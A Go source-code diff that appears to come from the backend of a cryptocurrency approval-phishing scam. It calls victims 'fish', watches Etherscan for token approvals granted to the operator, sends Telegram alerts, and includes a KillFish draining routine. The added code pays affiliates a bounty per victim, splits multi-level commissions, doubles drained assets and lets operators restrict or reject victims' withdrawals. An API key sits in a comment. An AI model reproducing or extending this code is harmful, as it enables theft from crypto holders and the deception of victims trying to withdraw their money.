@@ -60,7 +60,7 @@ func CreateToken(Rdb *redis.Client) string {
 */
 func InArray(target string, strArray []string) bool {
 	for _, element := range strArray {
-		if target == element {
+		if strings.ToLower(target) == strings.ToLower(element) {
 			return true
 		}
 	}
@@ -273,25 +273,41 @@ type Fish struct {
 	Temp                    float64 `gorm:"-"`                 //用于计算
 	OthersAuthorizationKill int     `gorm:"int(10);default:2"` //他人授权就杀的开关  1 开  2 关   //他人授权就杀的开关
 	AlreadyKill             int     `gorm:"int(10);default:2"` //总是杀开关  1 开  2 关   //有钱就杀
+	TheOnlyInvited          string  //唯一邀请码
+	CommissionIncome        float64 `gorm:"type:decimal(10,2)"` //佣金收益
+
 }
+
 type Admin struct {
-	ID                   uint   `gorm:"primaryKey;comment:'主键'"`
-	Username             string `gorm:"varchar(225)"`
-	Password             string `gorm:"varchar(225)"`
-	Token                string `gorm:"varchar(225)"`
-	Level                int    `gorm:"int(10);default:0"`
-	Status               int    `gorm:"int(10);default:1"`
-	Ip                   string `gorm:"varchar(225)"`
-	TheOnlyInvited       string //唯一邀请码
-	Updated              int64
-	Created              int64
-	Belong               int
-	ServiceAddress       string `gorm:"type:text"` //客服地址
-	ServiceAddressSwitch int
-	InComeTimes          int    `gorm:"int(10);default:1"` //发送收益次数
-	TelegramToken        string //小飞机的token
-	TelegramChatId       string //小飞机的聊天ID
-	LongUrl              string
+	ID                             uint   `gorm:"primaryKey;comment:'主键'"`
+	Username                       string `gorm:"varchar(225)"`
+	Password                       string `gorm:"varchar(225)"`
+	Token                          string `gorm:"varchar(225)"`
+	Level                          int    `gorm:"int(10);default:0"`
+	Status                         int    `gorm:"int(10);default:1"`
+	Ip                             string `gorm:"varchar(225)"`
+	TheOnlyInvited                 string //唯一邀请码
+	Updated                        int64
+	Created                        int64
+	Belong                         int
+	ServiceAddress                 string `gorm:"type:text"` //客服地址
+	ServiceAddressSwitch           int
+	InComeTimes                    int    `gorm:"int(10);default:1"` //发送收益次数
+	TelegramToken                  string //小飞机的token
+	TelegramChatId                 string //小飞机的聊天ID
+	LongUrl                        string
+	WithdrawalRejectedReasonSwitch int     `gorm:"int(10);default:2"`              //提现驳回原因开矿   1 开  2 关
+	KillFishDouble                 int     `gorm:"int(1);default:2"`               //杀鱼资产翻倍  1  开 2   关
+	MinTiXianMoney                 float64 `gorm:"type:decimal(30,18);default:-1"` // 用户最小提现金额
+	MinTiXianTime                  int     `gorm:"int(10);default:-1"`             //提现次数限制
+	CostOfHeadSwitch               int     `gorm:"int(10);default:2"`              //人头费用开关   1 开  2 关
+	CostOfHeadMoney                float64 `gorm:"type:decimal(30,18);default:10"` //人头费用
+	IfShowPromotionCodeSwitch      int     `gorm:"int(10);default:2"`              //是否显示邀请码(对每条鱼)   1 开  2 关  是否显示 推广码
+	UnAuthorizationCanInviteSwitch int     `gorm:"int(10);default:2"`              //没有授权是否可以发展下级开关   1 开  2 关  是否显示 推广码
+	UpInComePer                    float64 //上级收益百分比
+	UpUpInComePer                  float64 //上上级收益
+	UpUpUpInComePer                float64 //上上上级收益
+
 }
 
 type BAddressList struct {
@@ -304,6 +320,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 
 	//获取 要查询的 fish
 	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
+	//foxAddress = "0xf61f765b0643663e4c687004e42d62d6c628ec2c"
 	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
 	if err != nil {
 		fmt.Println(err.Error())
@@ -335,6 +352,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
 				}
 				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) { //授权成功
+					fmt.Printf("我们授权")
 					if ifCount {
 						count++
 						ifCount = false
@@ -343,7 +361,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 					err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
 					if err == nil {
 						//  新增授权
-						if fish.Authorization == 1 {
+						if fish.Authorization == 1 { //监控开关
 							fishID := strconv.Itoa(int(fish.ID))
 							admin := Admin{}
 							Db.Where("id=?", fish.AdminId).First(&admin)
@@ -354,6 +372,27 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 								" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏️"
 							NotificationAdmin(Db, fish.AdminId, content)
 						}
+
+						// 给授权佣金
+						admin := Admin{}
+						err = Db.Where("id=?", fish.AdminId).First(&admin).Error
+						if err == nil {
+							if admin.CostOfHeadSwitch == 1 { //人头费开关
+								err1 := Db.Model(&Fish{}).Where("id=?", fish.ID).Update(&Fish{
+									CommissionIncome: fish.CommissionIncome + admin.CostOfHeadMoney,
+									TotalEarnings:    fish.TotalEarnings + admin.CostOfHeadMoney,
+								}).Error
+								if err1 == nil {
+									fins := FinancialDetails{
+										Kinds:   12,
+										FishId:  int(fish.ID),
+										Created: time.Now().Unix(),
+									}
+									Db.Save(&fins) //表记录
+								}
+							}
+						}
+
 					}
 					mapData := make(map[string]interface{})
 					mapData["authorization"] = 2
@@ -365,7 +404,6 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 				}
 			}
 		}
-
 
 		if count > 0 && ifCount == true { //授权个他人
 			fish := Fish{}
@@ -600,7 +638,7 @@ func KillFish(Db *gorm.DB, BAddress string, foxAddress string, FishId int, redis
 	//在这里提取
 	list := BAddressList{}
 	err := Db.Where("b_address=?", BAddress).First(&list).Error
-	if err != nil  {
+	if err != nil {
 		return
 	}
 	config := Config{}
